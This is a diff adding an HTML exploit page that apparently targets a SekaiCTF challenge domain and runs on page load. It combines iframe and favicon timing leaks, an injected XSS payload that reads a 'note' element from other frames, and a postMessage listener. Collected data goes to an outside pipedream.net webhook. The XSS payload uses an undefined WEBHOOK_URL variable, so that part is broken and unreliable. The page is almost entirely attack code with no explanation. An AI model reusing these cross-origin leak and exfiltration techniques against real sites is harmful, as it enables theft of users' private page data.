@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag Extraction Attack</title>
+</head>
+<body>
+    <h1>Flag Extraction in Progress...</h1>
+    <div id="status">Starting attack...</div>
+    <div id="results"></div>
+
+    <script>
+        // 多种数据收集方式
+        const DATA_COLLECTORS = ['https://eojrldtpywxpwfm.m.pipedream.net'];
+        const TARGET_DOMAIN = 'nbv.chals.sekai.team';
+        
+        // 常见flag字符的ASCII码范围
+        const CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-!@#$%^&*()';
+        let discoveredFlag = '';
+        let currentPosition = 0;
+        
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+            console.log(msg);
+        }
+        
+        function sendResult(data) {
+            // 尝试多个端点发送数据
+            DATA_COLLECTORS.forEach((url, index) => {
+                setTimeout(() => {
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            timestamp: Date.now(),
+                            collector: index,
+                            ...data
+                        })
+                    }).catch(e => console.log(`Collector ${index} failed:`, e));
+                }, index * 100);
+            });
+            
+            // 同时使用console和DOM输出
+            const resultDiv = document.getElementById('results');
+            const logEntry = document.createElement('div');
+            logEntry.style.cssText = 'margin:5px 0; padding:5px; background:#f0f0f0; border-radius:3px; font-family:monospace; font-size:12px;';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${JSON.stringify(data)}`;
+            resultDiv.appendChild(logEntry);
+            
+            // 保持最新50条记录
+            while(resultDiv.children.length > 50) {
+                resultDiv.removeChild(resultDiv.firstChild);
+            }
+        }
+        
+        // 方法1: 时序攻击 - 测试特定位置的字符
+        function timingAttack() {
+            updateStatus('Starting timing attack...');
+            
+            // 预期flag格式: SEKAI{...}
+            const knownPrefix = 'SEKAI{';
+            
+            // 从已知前缀开始测试
+            for (let pos = knownPrefix.length; pos < 50; pos++) {
+                setTimeout(() => testCharacterAtPosition(pos), pos * 100);
+            }
+        }
+        
+        function testCharacterAtPosition(position) {
+            updateStatus(`Testing position ${position}...`);
+            
+            CHARSET.split('').forEach((char, index) => {
+                const charCode = char.charCodeAt(0);
+                
+                setTimeout(() => {
+                    // 创建iframe测试特定字符码的响应时间
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    
+                    const startTime = performance.now();
+                    iframe.onload = () => {
+                        const loadTime = performance.now() - startTime;
+                        
+                        // 如果加载时间异常，可能命中了正确字符
+                        if (loadTime > 100) { // 调整阈值
+                            updateStatus(`Potential match at pos ${position}: ${char} (${loadTime}ms)`);
+                            sendResult({
+                                method: 'timing',
+                                position: position,
+                                character: char,
+                                charCode: charCode,
+                                loadTime: loadTime
+                            });
+                        }
+                    };
+                    
+                    iframe.onerror = () => {
+                        const errorTime = performance.now() - startTime;
+                        if (errorTime < 50) { // 快速错误可能表示字符不存在
+                            sendResult({
+                                method: 'timing_error',
+                                position: position,
+                                character: char,
+                                errorTime: errorTime
+                            });
+                        }
+                    };
+                    
+                    // 尝试访问对应字符码的子域名
+                    iframe.src = `https://nbv-${position}-${charCode}.${TARGET_DOMAIN}/`;
+                    document.body.appendChild(iframe);
+                    
+                    // 清理
+                    setTimeout(() => {
+                        if (iframe.parentNode) {
+                            iframe.parentNode.removeChild(iframe);
+                        }
+                    }, 1000);
+                    
+                }, index * 50);
+            });
+        }
+        
+        // 方法2: XSS注入攻击
+        function xssAttack() {
+            updateStatus('Starting XSS attack...');
+            
+            // 构造XSS payload
+            const xssPayload = `<script>
+                // 尝试访问父页面或其他frame
+                try {
+                    // 遍历所有可能的frame
+                    for(let i = 0; i < 100; i++) {
+                        try {
+                            let targetFrame = parent.frames[i];
+                            if(targetFrame && targetFrame.document) {
+                                let noteElement = targetFrame.document.getElementById('note');
+                                if(noteElement && noteElement.textContent) {
+                                    // 找到包含flag的元素
+                                    fetch('${WEBHOOK_URL}', {
+                                        method: 'POST',
+                                        headers: {'Content-Type': 'application/json'},
+                                        body: JSON.stringify({
+                                            method: 'xss_direct',
+                                            flag: noteElement.textContent,
+                                            frameIndex: i
+                                        })
+                                    });
+                                    break;
+                                }
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    // 尝试通过window对象访问
+                    if(window.parent !== window) {
+                        window.parent.postMessage({type: 'getFlag'}, '*');
+                    }
+                    
+                    // 发送当前页面信息
+                    fetch('${WEBHOOK_URL}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            method: 'xss_info',
+                            url: location.href,
+                            domain: location.hostname,
+                            referrer: document.referrer
+                        })
+                    });
+                } catch(e) {
+                    fetch('${WEBHOOK_URL}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            method: 'xss_error',
+                            error: e.toString()
+                        })
+                    });
+                }
+            <\/script>`;
+            
+            // 将XSS payload注入到子域名页面
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://nbv-0-60.${TARGET_DOMAIN}/?note=${encodeURIComponent(xssPayload)}`;
+            document.body.appendChild(iframe);
+        }
+        
+        // 方法3: 网络时序 + 缓存攻击
+        function cacheAttack() {
+            updateStatus('Starting cache attack...');
+            
+            // 尝试通过缓存行为推断字符
+            const testChars = 'SEKAI{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}';
+            
+            testChars.split('').forEach((char, index) => {
+                setTimeout(() => {
+                    const charCode = char.charCodeAt(0);
+                    
+                    // 快速连续请求同一个字符码的不同位置
+                    for(let pos = 0; pos < 10; pos++) {
+                        const img = new Image();
+                        const startTime = performance.now();
+                        
+                        img.onload = img.onerror = () => {
+                            const loadTime = performance.now() - startTime;
+                            sendResult({
+                                method: 'cache',
+                                position: pos,
+                                character: char,
+                                charCode: charCode,
+                                loadTime: loadTime
+                            });
+                        };
+                        
+                        img.src = `https://nbv-${pos}-${charCode}.${TARGET_DOMAIN}/favicon.ico?_=${Date.now()}`;
+                    }
+                }, index * 100);
+            });
+        }
+        
+        // 方法4: PostMessage监听
+        function setupPostMessageListener() {
+            window.addEventListener('message', function(event) {
+                updateStatus(`Received message from ${event.origin}`);
+                sendResult({
+                    method: 'postmessage',
+                    origin: event.origin,
+                    data: event.data
+                });
+            });
+        }
+        
+        // 启动所有攻击方法
+        function startAttack() {
+            updateStatus('Initializing attack vectors...');
+            
+            setupPostMessageListener();
+            
+            setTimeout(timingAttack, 1000);
+            setTimeout(xssAttack, 2000);  
+            setTimeout(cacheAttack, 3000);
+            
+            // 发送初始状态
+            sendResult({
+                method: 'init',
+                userAgent: navigator.userAgent,
+                timestamp: Date.now(),
+                url: location.href
+            });
+        }
+        
+        // 页面加载完成后开始攻击
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', startAttack);
+        } else {
+            startAttack();
+        }
+        
+        // 监听页面卸载事件
+        window.addEventListener('beforeunload', function() {
+            sendResult({
+                method: 'cleanup',
+                timestamp: Date.now()
+            });
+        });
+    </script>
+</body>
+</html>
